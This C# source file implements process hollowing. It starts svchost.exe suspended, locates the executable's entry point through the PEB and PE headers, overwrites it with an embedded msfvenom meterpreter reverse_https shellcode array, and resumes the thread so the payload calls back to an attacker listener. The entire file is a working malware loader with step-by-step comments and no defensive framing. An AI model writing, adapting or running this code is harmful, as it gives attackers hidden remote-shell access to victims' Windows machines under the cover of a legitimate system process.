﻿using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    internal class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=10000 -a x64 -f csharp
            byte[] buf = new byte[621] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                                        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
                                        0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,
                                        0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
                                        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
                                        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
                                        0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
                                        0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                                        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                                        0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x01,0xd0,
                                        0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
                                        0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
                                        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                                        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                                        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
                                        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
                                        0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
                                        0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                                        0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
                                        0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
                                        0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
                                        0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
                                        0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
                                        0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
                                        0x2e,0x38,0x2e,0x32,0x30,0x35,0x00,0x5a,0x48,0x89,0xc1,0x49,
                                        0xc7,0xc0,0x10,0x27,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,
                                        0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,
                                        0xff,0xd5,0xe8,0x44,0x00,0x00,0x00,0x2f,0x38,0x4d,0x66,0x43,
                                        0x79,0x6b,0x71,0x4b,0x6c,0x79,0x2d,0x69,0x53,0x71,0x4e,0x49,
                                        0x78,0x4d,0x6a,0x58,0x37,0x51,0x69,0x54,0x41,0x50,0x6c,0x6f,
                                        0x45,0x52,0x4a,0x4b,0x51,0x72,0x56,0x5a,0x41,0x58,0x4c,0x45,
                                        0x5a,0x4a,0x57,0x75,0x44,0x4d,0x64,0x6f,0x41,0x66,0x69,0x65,
                                        0x73,0x5a,0x69,0x46,0x42,0x4a,0x6f,0x6b,0x53,0x46,0x39,0x54,
                                        0x30,0x36,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,
                                        0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,
                                        0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,
                                        0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,
                                        0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,
                                        0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,
                                        0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,
                                        0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,
                                        0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,
                                        0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,
                                        0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,
                                        0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,
                                        0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,
                                        0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,
                                        0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,
                                        0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,
                                        0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,
                                        0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,
                                        0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,
                                        0x56,0xff,0xd5};

            // Start 'svchost.exe' in a suspended state
            StartupInfo si = new StartupInfo();
            ProcessInfo pi = new ProcessInfo();

            bool cResult = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pi.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo bi = new ProcessBasicInfo();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            long qResult = ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + ptrToImageBase.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] addrBuf = new byte[0x8];
            byte[] data = new byte[0x200];
            IntPtr nRead = IntPtr.Zero;
            bool result = ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            result = ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + svchostBase.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew_offset.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint opthdr = e_lfanew_offset + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + opthdr.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + entrypoint_rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + addressOfEntryPoint.ToString("x")}.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pi.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}
